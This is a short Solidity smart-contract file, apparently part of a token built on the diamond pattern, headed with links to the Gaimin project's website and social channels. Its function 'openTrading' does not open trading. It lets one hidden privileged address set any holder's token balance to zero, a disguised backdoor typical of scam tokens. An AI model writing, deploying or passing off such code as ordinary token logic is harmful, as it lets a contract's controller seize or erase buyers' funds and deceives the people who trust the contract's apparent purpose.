/*
 * SPDX-License-Identifier: MIT
 * Website:  https://www.gaimin.io/
 * Telegram: https://t.me/+XFTC523WeTI1MjA0
 * Twitter:  https://twitter.com/GaiminIo
 * Discord:  https://discord.com/invite/jemqJ9PkCJ
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
